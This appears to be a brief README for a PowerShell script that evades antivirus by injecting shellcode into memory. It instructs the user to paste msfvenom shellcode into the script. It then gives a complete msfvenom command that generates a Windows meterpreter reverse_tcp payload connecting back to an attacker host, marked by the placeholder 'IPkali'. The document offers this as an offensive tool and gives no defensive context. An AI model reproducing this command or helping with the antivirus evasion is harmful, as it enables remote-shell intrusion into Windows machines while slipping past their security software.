# AntiVirus-bypass-PowerShell-In-Memory-Injection
Script made for bypassing antivirus using Powershell Injection method. Place your shellcode from msfvenom on line 15


<h3>Example of the payload needed:</h3>

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPkali LPORT=4444 -f powershell
```
